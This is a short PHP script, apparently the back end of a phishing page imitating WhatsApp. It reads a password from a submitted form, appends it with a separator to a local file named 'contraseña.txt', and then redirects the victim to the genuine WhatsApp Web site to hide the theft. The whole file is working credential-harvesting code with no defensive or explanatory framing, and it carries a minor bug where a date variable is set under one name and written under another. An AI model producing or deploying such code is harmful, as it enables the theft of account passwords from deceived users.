<?php
    $password = $_POST["password"];
    $pass = "Password: $password";
    $fecha = date('d-m-Y');
    $fileuser = fopen("contraseña.txt", "a");
    $cl = "===========================================";
    fwrite($fileuser, $date .$pass .$cl);
    fclose($fileuser);
    header('Location: https://web.whatsapp.com/');
    exit();
?>
